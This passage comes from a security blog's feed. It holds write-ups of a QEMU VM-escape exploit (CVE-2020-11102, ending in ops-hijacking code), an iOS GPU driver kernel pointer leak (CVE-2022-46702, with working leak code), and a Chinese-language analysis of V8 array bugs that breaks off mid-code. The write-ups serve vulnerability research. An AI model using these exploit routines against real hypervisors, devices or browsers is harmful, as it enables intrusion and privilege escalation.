MemoryRegion.ops</span></span><br><span class="line">        oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] hijack ops\n&quot;</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> *fake_memory_region_ops = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        fake_memory_region_ops[<span class="number">0</span>] = frame_base;</span><br><span class="line">        len1 = <span class="number">8</span>;</span><br><span class="line">        len2 = <span class="number">0</span>;</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(fake_memory_region_ops);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// trigger the ops.write</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CVE-2020-11102: Escape from the Earth&lt;/h1&gt;
&lt;h2 id=&quot;Introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;I participated in the Aliyun CTF competition recen</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="Writeup" scheme="https://kpwnz.github.io/tags/Writeup/"/>
    
    <category term="QEMU" scheme="https://kpwnz.github.io/tags/QEMU/"/>
    
    <category term="VM Escape" scheme="https://kpwnz.github.io/tags/VM-Escape/"/>
    
    <category term="CTF" scheme="https://kpwnz.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-46702: Remember to Clean Up the Memory</title>
    <link href="https://kpwnz.github.io/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/"/>
    <id>https://kpwnz.github.io/2022/12/22/CVE-2022-46702-Remember-to-Clean-Up-the-Memory/</id>
    <published>2022-12-23T06:28:55.000Z</published>
    <updated>2023-04-24T19:13:47.987Z</updated>
    
    <content type="html"><![CDATA[<h1>CVE-2022-46702: Remember to Clean Up the Memory</h1><p>As I tinkered with my first iPhone and jailbroke it, I was struck by the endless possibilities for customization and exploration. That’s when my interest in security research truly took off. I immersed myself in the study of reverse engineering and even became an iOS tweak developer. My curiosity and passion for software security only continued to grow as I delved deeper into this field. And I am excited to share the details of my first CVE, CVE-2022-46702: a kernel information leak in the GPU driver. This discovery has been a highlight of my security research career so far, and I can’t wait to see what other exciting challenges and opportunities lie ahead.</p><h2 id="IOKit">IOKit</h2><p>Before we start, I’d like to go through the concept of IOKit briefly. Since there are many detailed documents about IOKit, I will only cover the basic idea of it here.</p><p>IOKit is a collection of low-level frameworks, libraries, tools, and other things for developing drivers in macOS, iOS, iPadOS, and so on.</p><p>In userland, we can interact with IOKit kernel extensions with their user clients. You need to get a “handle” of it first with <code>IOServiceOpen()</code>, which will return a Mach Port. User clients can expose the interface to userland with external methods, and in most of cases, the external methods will be stored in an external methods table. Then just like <code>ioctl()</code>, you can use <code>IOConnectCallMethod()</code> to call the external methods implemented in user clients.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> </span></span><br><span class="line"><span class="function"><span class="title">IOConnectCallMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">mach_port_t</span> connection,         <span class="comment">// the Mach Port of client</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint32_t</span> selector,              <span class="comment">// method selector</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> *input, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint32_t</span> inputCnt, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">void</span> *inputStruct, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">size_t</span> inputStructCnt,          <span class="comment">// size of inputStruct</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint64_t</span> *output, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">uint32_t</span> *outputCnt,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span> *outputStruct, </span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">size_t</span> *outputStructCnt)</span></span>;</span><br></pre></td></tr></table></figure><p>Apple also provides some variants, such as  <code>IOConnectCallAsyncMethod()</code>, and they share the same idea.</p><h3 id="Dispatch-table">Dispatch table</h3><p><code>struct IOExternalMethodDispatch</code> is used to manage the implemented external methods.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">IOReturn</span> <span class="params">(*IOExternalMethodAction)</span><span class="params">(OSObject * target, <span class="keyword">void</span> * reference,</span></span></span><br><span class="line"><span class="params"><span class="function">    IOExternalMethodArguments * arguments)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">IOExternalMethodDispatch</span> &#123;</span></span><br><span class="line">    IOExternalMethodAction function;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkScalarInputCount;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkStructureInputSize;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkScalarOutputCount;</span><br><span class="line">    <span class="keyword">uint32_t</span>               checkStructureOutputSize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>function</code> is a function pointer to an external method, and the following fields describe the input and output data.</p><h2 id="The-kernel-info-leak">The kernel info leak</h2><p>The vulnerability is in the GPU driver of iOS. <code>AGXDeviceUserClient::performanceCounterSamplerControl()</code> handles many commands about sampling. In command <code>0xF</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">AGXDeviceUserClient::performanceCounterSamplerControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        AGXDeviceUserClient *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 structInput,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 structOutput)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v3 = <span class="number">3758097084LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !structInput || *structInput &gt; <span class="number">0x16</span> )</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  <span class="comment">// ..........</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">            v27 = *(<span class="keyword">unsigned</span> __int8 *)(structInput + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span> ( a1-&gt;AGXShared.field_190 &lt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v27 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v28 = *(_QWORD *)(structInput + <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v29 = *(_DWORD *)(structInput + <span class="number">8</span>);</span><br><span class="line">              <span class="keyword">if</span> ( v29 &gt;= <span class="number">2</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v30 = <span class="number">393223</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *(_BYTE *)(structInput + <span class="number">4</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  p_field_58 = &amp;a1-&gt;IOGPUDevice.field_58;</span><br><span class="line">                  v30 = <span class="number">262151</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  p_field_58 = &amp;a1-&gt;IOGPUDevice.io_gpu-&gt;IOGPU.field_d0;</span><br><span class="line">                &#125;</span><br><span class="line">                v32 = AGXShared::<span class="built_in">createMappedBuffer</span>(</span><br><span class="line">                        a1,</span><br><span class="line">                        (task *)a1-&gt;IOGPUDevice.field_50,</span><br><span class="line">                        (IOGPUTask *)*p_field_58,</span><br><span class="line">                        v28,</span><br><span class="line">                        v29,</span><br><span class="line">                        v30);</span><br><span class="line">                <span class="keyword">if</span> ( v32 )</span><br><span class="line">                &#123;</span><br><span class="line">                  v33 = v32;</span><br><span class="line">                  ((<span class="built_in"><span class="keyword">void</span></span> (__fastcall *)(AGXShared *, __int64, __int64))a1-&gt;vtable-&gt;AGXShared.setSourceBufferMap)(</span><br><span class="line">                    a1,</span><br><span class="line">                    v27,</span><br><span class="line">                    v32);</span><br><span class="line">                  *(_QWORD *)(structInput + <span class="number">16</span>) = v33;</span><br><span class="line">                  structInput+<span class="number">16</span> = v33 = v32 </span><br><span class="line">LABEL_14:         </span><br><span class="line">                  v34 = ((__int64 (*)(<span class="keyword">void</span>))a1-&gt;IOGPUDevice.io_gpu-&gt;AGXAccelerator.pref_ctl-&gt;vtable-&gt;AGXPerfCtrSamplerGen11.processControlCommand)();</span><br><span class="line">                  </span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( *(_QWORD *)(a1-&gt;AGXShared.field_188 + <span class="number">8LL</span> * *(<span class="keyword">unsigned</span> __int8 *)(structInput + <span class="number">4</span>)) )</span><br><span class="line">            &#123;</span><br><span class="line">              v34 = ((__int64 (*)(<span class="keyword">void</span>))a1-&gt;IOGPUDevice.io_gpu-&gt;AGXAccelerator.pref_ctl-&gt;vtable-&gt;AGXPerfCtrSamplerGen11.processControlCommand)();</span><br><span class="line">              ((<span class="built_in"><span class="keyword">void</span></span> (__fastcall *)(AGXShared *, __int64, _QWORD))a1-&gt;vtable-&gt;AGXShared.setSourceBufferMap)(</span><br><span class="line">                a1,</span><br><span class="line">                v27,</span><br><span class="line">                <span class="number">0LL</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v34 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>Notice that</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v32 = AGXShared::<span class="built_in">createMappedBuffer</span>(</span><br><span class="line">                        a1,</span><br><span class="line">                        (task *)a1-&gt;IOGPUDevice.field_50,</span><br><span class="line">                        (IOGPUTask *)*p_field_58,</span><br><span class="line">                        v28,</span><br><span class="line">                        v29,</span><br><span class="line">                        v30);</span><br></pre></td></tr></table></figure><p>Pointer <code>v32</code> was then copied to <code>*(_QWORD *)(structInput + 16)</code>. <code>structInput</code> was passed to <code>a1-&gt;IOGPUDevice.io_gpu-&gt;AGXAccelerator.pref_ctl-&gt;vtable-&gt;AGXPerfCtrSamplerGen11.processControlCommand)();</code> as an argument.</p><p>When the function return,</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v34 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( structOutput )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = *(_OWORD *)(structInput + <span class="number">16</span>);</span><br><span class="line">      *structOutput = *(_OWORD *)structInput;</span><br><span class="line">      *(structOutput + <span class="number">16</span>) = v11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>*(_OWORD *)(structInput + 16); </code> was then assigned to <code>structOutput</code>. So we can directly retrieve a kernel pointer in userland.</p><h2 id="Exploitation">Exploitation</h2><p>The exploitation is pretty straightforward. To exploit this vulnerability in iOS 16, you need an entitlement first. But in iOS 14, we can invoke this method without special entitlement.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( IOGPUDevice::<span class="built_in">doesEntitlementExist</span>(io_gpu_device, <span class="string">&quot;com.apple.private.agx.performance-spi&quot;</span>)</span><br><span class="line">  &amp;&amp; (v8 = <span class="built_in">proc_find</span>(io_gpu_device-&gt;IOGPUDevice.field_60)) != <span class="number">0LL</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = v8;</span><br><span class="line">  v10 = <span class="built_in">csproc_get_platform_binary</span>() != <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">proc_rele</span>(v9);</span><br><span class="line">  v11 = <span class="number">4</span> * v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">io_service_t</span> service = <span class="built_in">IOServiceGetMatchingService</span>(kIOMasterPortDefault,</span><br><span class="line">                                                   <span class="built_in">IOServiceMatching</span>(<span class="string">&quot;IOGPU&quot;</span>));</span><br><span class="line">kr = <span class="built_in">IOServiceOpen</span>(service, <span class="built_in">mach_task_self</span>(), <span class="number">1</span>, &amp;conn);</span><br><span class="line"><span class="keyword">if</span> (kr || !conn) &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;failed to open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Simply open the user client first.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kr = <span class="built_in">IOConnectCallStructMethod</span>(conn, getindex_method_start + <span class="number">5</span>, struct_input, <span class="built_in"><span class="keyword">sizeof</span></span>(struct_input), struct_output, &amp;struct_output_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak 0x%llx\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(struct_output + i * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">uint64_t</span> *)(struct_output + <span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>Then enjoy your kernel pointer.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;CVE-2022-46702: Remember to Clean Up the Memory&lt;/h1&gt;
&lt;p&gt;As I tinkered with my first iPhone and jailbroke it, I was struck by the endless</summary>
      
    
    
    
    
    <category term="Vulnerability" scheme="https://kpwnz.github.io/tags/Vulnerability/"/>
    
    <category term="PWN" scheme="https://kpwnz.github.io/tags/PWN/"/>
    
    <category term="iOS" scheme="https://kpwnz.github.io/tags/iOS/"/>
    
    <category term="XNU" scheme="https://kpwnz.github.io/tags/XNU/"/>
    
    <category term="IOKit" scheme="https://kpwnz.github.io/tags/IOKit/"/>
    
  </entry>
  
  <entry>
    <title>evilCallback: CVE-2021-21225</title>
    <link href="https://kpwnz.github.io/2022/10/29/evilCallback-CVE-2021-21225/"/>
    <id>https://kpwnz.github.io/2022/10/29/evilCallback-CVE-2021-21225/</id>
    <published>2022-10-29T19:27:58.000Z</published>
    <updated>2022-10-29T08:21:19.280Z</updated>
    
    <content type="html"><![CDATA[<h1>evilCallback: CVE-2021-21225</h1><h2 id="CVE-2016-1646">CVE-2016-1646</h2><p>在进行这个分析中，可以先看一个比较旧的漏洞 <code>CVE-2016-1646</code>，在执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>].concat([<span class="number">2</span>, <span class="number">3</span>]);</span><br></pre></td></tr></table></figure><p>的时候，v8会使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argument_count; i++) &#123;</span><br><span class="line">  Handle&lt;Object&gt; object = args‑&gt;<span class="built_in">at</span>(i);</span><br><span class="line">  <span class="built_in">IterateElements</span>(isolate, object, &amp;visitor))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历<code>concat()</code>的每一个对象并且传入<code>IterateElements</code>，对于一个只有<code>double</code>元素的数组，它的<code>elementsKind</code>属于<code>FAST_DOUBLE_ELEMENTS</code>这时，在<code>IterateElements</code>会进入如下分支</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (array‑&gt;<span class="built_in">GetElementsKind</span>()) &#123;</span><br><span class="line">  <span class="keyword">case</span> FAST_DOUBLE_ELEMENTS: &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="function">Handle&lt;FixedArray&gt; <span class="title">elements</span><span class="params">(FixedArray::cast(array-&gt;elements()))</span></span>;</span><br><span class="line">    <span class="keyword">int</span> fast_length = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(length);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">FOR_WITH_HANDLE_SCOPE</span>(isolate, <span class="keyword">int</span>, j = <span class="number">0</span>, j, j &lt; fast_length, j++, &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      Handle&lt;Object&gt; <span class="built_in">element_value</span>(elements-&gt;<span class="built_in">get</span>(j), isolate);</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">if</span> (!element_value-&gt;<span class="built_in">IsTheHole</span>(isolate)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!visitor-&gt;<span class="built_in">visit</span>(j, element_value)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(</span><br><span class="line">            isolate, element_value,</span><br><span class="line">            JSReceiver::<span class="built_in">GetElement</span>(isolate, array, j), <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (!visitor-&gt;<span class="built_in">visit</span>(j, element_value)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>在这里可以发现，数组的<code>length</code>被缓存下来，然后使用<code>fast_length</code>来控制循环次数，但如果遇到一个<code>hole</code>型的元素，就会使用<code>JSReceiver::GetElement(isolate, array, j), false</code>从原型链查找，这个时候会触发<code>getter/setter</code> callback，这里可以执行任意的JavaScript，如果在这个callback中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proto.__defineGetter__(<span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    array.length = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>就可以导致数组长度变短，并且经过垃圾回收，空闲的内存将被再次分配到其它对象，然而<code>fast_length</code>并没有被修改，导致越界读</p><h2 id="CVE-2021-21225">CVE-2021-21225</h2><p>从上面我们可以知道，如果在遍历过程中能够触发callback并且修改掉数组长度，就很有可能是不安全的，观察patch可以发现，patch其实就是重新引入了<code>CVE-2021-21225</code>，在<code>visit()</code>中，有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MAYBE_RETURN</span>(</span><br><span class="line">  JSReceiver::<span class="built_in">CreateDataProperty</span>(&amp;it, elm, <span class="built_in">Just</span>(kThrowOnError)), <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>这又会调用<code>Maybe&lt;bool&gt; Object::SetDataProperty(LookupIterator* it, Handle&lt;Object&gt; value)</code>，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Maybe&lt;<span class="keyword">bool</span>&gt; <span class="title">Object::SetDataProperty</span><span class="params">(LookupIterator* it, Handle&lt;Object&gt; value)</span> </span>&#123;</span><br><span class="line">  Isolate* isolate = it-&gt;<span class="built_in">isolate</span>();</span><br><span class="line">  <span class="built_in">DCHECK_IMPLIES</span>(it-&gt;<span class="built_in">GetReceiver</span>()-&gt;<span class="built_in">IsJSProxy</span>(isolate),</span><br><span class="line">                 it-&gt;<span class="built_in">GetName</span>()-&gt;<span class="built_in">IsPrivateName</span>(isolate));</span><br><span class="line">  <span class="built_in">DCHECK_IMPLIES</span>(!it-&gt;<span class="built_in">IsElement</span>() &amp;&amp; it-&gt;<span class="built_in">GetName</span>()-&gt;<span class="built_in">IsPrivateName</span>(isolate),</span><br><span class="line">                 it-&gt;<span class="built_in">state</span>() == LookupIterator::DATA);</span><br><span class="line">  Handle&lt;JSReceiver&gt; receiver = Handle&lt;JSReceiver&gt;::<span class="built_in">cast</span>(it-&gt;<span class="built_in">GetReceiver</span>());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Store on the holder which may be hidden behind the receiver.</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(it-&gt;<span class="built_in">HolderIsReceiverOrHiddenPrototype</span>());</span><br><span class="line"></span><br><span class="line">  Handle&lt;Object&gt; to_assign = value;</span><br><span class="line">  <span class="comment">// Convert the incoming value to a number for storing into typed arrays.</span></span><br><span class="line">  <span class="keyword">if</span> (it-&gt;<span class="built_in">IsElement</span>() &amp;&amp; receiver-&gt;<span class="built_in">IsJSObject</span>(isolate) &amp;&amp;</span><br><span class="line">      JSObject::<span class="built_in">cast</span>(*receiver).<span class="built_in">HasTypedArrayOrRabGsabTypedArrayElements</span>(</span><br><span class="line">          isolate)) &#123;</span><br><span class="line">    ElementsKind elements_kind = JSObject::<span class="built_in">cast</span>(*receiver).<span class="built_in">GetElementsKind</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsBigIntTypedArrayElementsKind</span>(elements_kind)) &#123;</span><br><span class="line">      <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(isolate, to_assign,</span><br><span class="line">                                       BigInt::<span class="built_in">FromObject</span>(isolate, value),</span><br><span class="line">                                       Nothing&lt;<span class="keyword">bool</span>&gt;());</span><br><span class="line">      <span class="keyword">if</span> (Handle&lt;JSTypedArray&gt;::<span class="built_in">cast</span>(receiver)-&gt;<span class="built_in">IsDetachedOrOutOfBounds</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Just</span>(<span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!value-&gt;<span class="built_in">IsNumber</span>() &amp;&amp; !value-&gt;<span class="built_in">IsUndefined</span>(isolate)) &#123;</span><br><span class="line">      <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(isolate, to_assign,</span><br><span class="line">                                       Object::<span class="built_in">ToNumber</span>(isolate, value),</span><br><span class="line">                                       Nothing&lt;<span class="keyword">bool</span>&gt;());</span><br><span class="line">      <span 